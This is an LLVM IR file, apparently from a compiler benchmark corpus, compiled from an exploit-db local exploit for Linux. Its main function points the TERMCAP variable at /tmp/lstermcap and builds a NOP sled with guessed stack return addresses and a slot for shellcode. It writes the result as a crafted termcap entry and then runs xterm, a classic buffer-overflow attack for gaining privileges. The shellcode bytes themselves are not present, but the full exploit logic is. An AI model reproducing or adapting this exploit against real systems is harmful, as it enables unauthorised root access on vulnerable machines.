; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19465.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19465.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [8 x i8] c"TERMCAP\00", align 1
@.str.1 = private unnamed_addr constant [15 x i8] c"/tmp/lstermcap\00", align 1
@DEFAULT_BUFSIZE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [24 x i8] c"bufsize: %i\0Aoffset: %i\0A\00", align 1
@.str.3 = private unnamed_addr constant [30 x i8] c"can't allocate enough memory\0A\00", align 1
@entry1 = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [16 x i8] c"get_sp(): 0x%x\0A\00", align 1
@.str.5 = private unnamed_addr constant [21 x i8] c"get_sp()-offs: 0x%x\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.6 = private unnamed_addr constant [7 x i8] c"%s%s%s\00", align 1
@filename = common dso_local global i32 0, align 4
@O_WRONLY = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@O_TRUNC = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [14 x i8] c"made termcap\0A\00", align 1
@.str.8 = private unnamed_addr constant [21 x i8] c"/usr/X11R6/bin/xterm\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"xterm\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = call i32 @setenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), i32 1)
  %15 = load i32, i32* @DEFAULT_BUFSIZE, align 4
  store i32 %15, i32* %6, align 4
  %16 = load i32, i32* %4, align 4
  %17 = icmp sgt i32 %16, 2
  br i1 %17, label %18, label %23

18:                                               ; preds = %2
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 2
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 @atoi(i8* %21)
  store i32 %22, i32* %6, align 4
  br label %23

23:                                               ; preds = %18, %2
  %24 = load i32, i32* %4, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %31

26:                                               ; preds = %23
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 1
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @atoi(i8* %29)
  store i32 %30, i32* %7, align 4
  br label %32

31:                                               ; preds = %23
  store i32 300, i32* %7, align 4
  br label %32

32:                                               ; preds = %31, %26
  %33 = load i32, i32* %6, align 4
  %34 = load i32, i32* %7, align 4
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0), i32 %33, i32 %34)
  %36 = load i32, i32* %6, align 4
  %37 = call i8* @malloc(i32 %36)
  store i8* %37, i8** %12, align 8
  %38 = icmp ne i8* %37, null
  br i1 %38, label %42, label %39

39:                                               ; preds = %32
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0))
  %41 = call i32 @exit(i32 0) #3
  unreachable

42:                                               ; preds = %32
  %43 = load i32, i32* %6, align 4
  %44 = load i8*, i8** @entry1, align 8
  %45 = call i32 @strlen(i8* %44)
  %46 = add nsw i32 %43, %45
  %47 = call i8* @malloc(i32 %46)
  store i8* %47, i8** %13, align 8
  %48 = icmp ne i8* %47, null
  br i1 %48, label %52, label %49

49:                                               ; preds = %42
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0))
  %51 = call i32 @exit(i32 0) #3
  unreachable

52:                                               ; preds = %42
  %53 = call i32 (...) @get_sp()
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0), i32 %53)
  %55 = call i32 (...) @get_sp()
  %56 = load i32, i32* %7, align 4
  %57 = sub nsw i32 %55, %56
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.5, i64 0, i64 0), i32 %57)
  %59 = load i8*, i8** %12, align 8
  store i8* %59, i8** %11, align 8
  %60 = load i8*, i8** %12, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 2
  %62 = bitcast i8* %61 to i64*
  store i64* %62, i64** %10, align 8
  store i32 0, i32* %8, align 4
  br label %63

63:                                               ; preds = %74, %52
  %64 = load i32, i32* %8, align 4
  %65 = load i32, i32* %6, align 4
  %66 = icmp slt i32 %64, %65
  br i1 %66, label %67, label %77

67:                                               ; preds = %63
  %68 = call i32 (...) @get_sp()
  %69 = load i32, i32* %7, align 4
  %70 = sub nsw i32 %68, %69
  %71 = sext i32 %70 to i64
  %72 = load i64*, i64** %10, align 8
  %73 = getelementptr inbounds i64, i64* %72, i32 1
  store i64* %73, i64** %10, align 8
  store i64 %71, i64* %72, align 8
  br label %74

74:                                               ; preds = %67
  %75 = load i32, i32* %8, align 4
  %76 = add nsw i32 %75, 4
  store i32 %76, i32* %8, align 4
  br label %63

77:                                               ; preds = %63
  store i32 0, i32* %8, align 4
  br label %78

78:                                               ; preds = %88, %77
  %79 = load i32, i32* %8, align 4
  %80 = load i32, i32* %6, align 4
  %81 = sdiv i32 %80, 2
  %82 = icmp slt i32 %79, %81
  br i1 %82, label %83, label %91

83:                                               ; preds = %78
  %84 = load i8*, i8** %12, align 8
  %85 = load i32, i32* %8, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8, i8* %84, i64 %86
  store i8 -112, i8* %87, align 1
  br label %88

88:                                               ; preds = %83
  %89 = load i32, i32* %8, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %8, align 4
  br label %78

91:                                               ; preds = %78
  %92 = load i8*, i8** %12, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sdiv i32 %93, 2
  %95 = load i8*, i8** @shellcode, align 8
  %96 = call i32 @strlen(i8* %95)
  %97 = sdiv i32 %96, 2
  %98 = sub nsw i32 %94, %97
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i8, i8* %92, i64 %99
  store i8* %100, i8** %11, align 8
  store i32 0, i32* %8, align 4
  br label %101

101:                                              ; preds = %114, %91
  %102 = load i32, i32* %8, align 4
  %103 = load i8*, i8** @shellcode, align 8
  %104 = call i32 @strlen(i8* %103)
  %105 = icmp slt i32 %102, %104
  br i1 %105, label %106, label %117

106:                                              ; preds = %101
  %107 = load i8*, i8** @shellcode, align 8
  %108 = load i32, i32* %8, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = load i8, i8* %110, align 1
  %112 = load i8*, i8** %11, align 8
  %113 = getelementptr inbounds i8, i8* %112, i32 1
  store i8* %113, i8** %11, align 8
  store i8 %111, i8* %112, align 1
  br label %114

114:                                              ; preds = %106
  %115 = load i32, i32* %8, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %8, align 4
  br label %101

117:                                              ; preds = %101
  %118 = load i8*, i8** %11, align 8
  %119 = getelementptr inbounds i8, i8* %118, i64 24
  store i8* %119, i8** %11, align 8
  %120 = load i8*, i8** %11, align 8
  %121 = getelementptr inbounds i8, i8* %120, i32 1
  store i8* %121, i8** %11, align 8
  store i8 58, i8* %120, align 1
  %122 = load i8*, i8** %11, align 8
  %123 = getelementptr inbounds i8, i8* %122, i32 1
  store i8* %123, i8** %11, align 8
  store i8 92, i8* %122, align 1
  %124 = load i8*, i8** %13, align 8
  %125 = load i32, i32* %6, align 4
  %126 = load i8*, i8** @entry1, align 8
  %127 = call i32 @strlen(i8* %126)
  %128 = add nsw i32 %125, %127
  %129 = load i8*, i8** @entry1, align 8
  %130 = load i8*, i8** %12, align 8
  %131 = call i32 @snprintf(i8* %124, i32 %128, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0), i8* %129, i8* %130)
  %132 = load i32, i32* @filename, align 4
  %133 = load i32, i32* @O_WRONLY, align 4
  %134 = load i32, i32* @O_CREAT, align 4
  %135 = or i32 %133, %134
  %136 = load i32, i32* @O_TRUNC, align 4
  %137 = or i32 %135, %136
  %138 = call i32 @open(i32 %132, i32 %137, i32 438)
  store i32 %138, i32* %9, align 4
  %139 = load i32, i32* %9, align 4
  %140 = load i8*, i8** %13, align 8
  %141 = load i8*, i8** %13, align 8
  %142 = call i32 @strlen(i8* %141)
  %143 = call i32 @write(i32 %139, i8* %140, i32 %142)
  %144 = load i32, i32* %9, align 4
  %145 = call i32 @close(i32 %144)
  %146 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i64 0, i64 0))
  %147 = call i32 @execl(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i64 0, i64 0), i32 0)
  %148 = load i32, i32* %3, align 4
  ret i32 %148
}

declare dso_local i32 @setenv(i8*, i8*, i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @malloc(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, i8*) #1

declare dso_local i32 @open(i32, i32, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @execl(i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
